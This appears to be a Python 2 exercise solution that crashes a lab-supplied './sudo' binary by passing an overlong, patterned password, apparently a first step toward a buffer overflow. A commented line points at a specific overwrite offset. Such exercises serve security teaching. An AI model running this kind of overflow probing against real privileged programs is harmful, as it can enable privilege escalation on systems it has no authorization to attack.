import os, sys


PATH_TO_SUDO = './sudo'


def crash_sudo():
    # Your code here
    password = "AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ"  # too long password on purpose
    # password = "A"*67 + "BCDE"
    # subprocess.call([PATH_TO_SUDO, password, "whoami"])
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, password, "kloom")


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    crash_sudo()


if __name__ == '__main__':
    main(sys.argv)
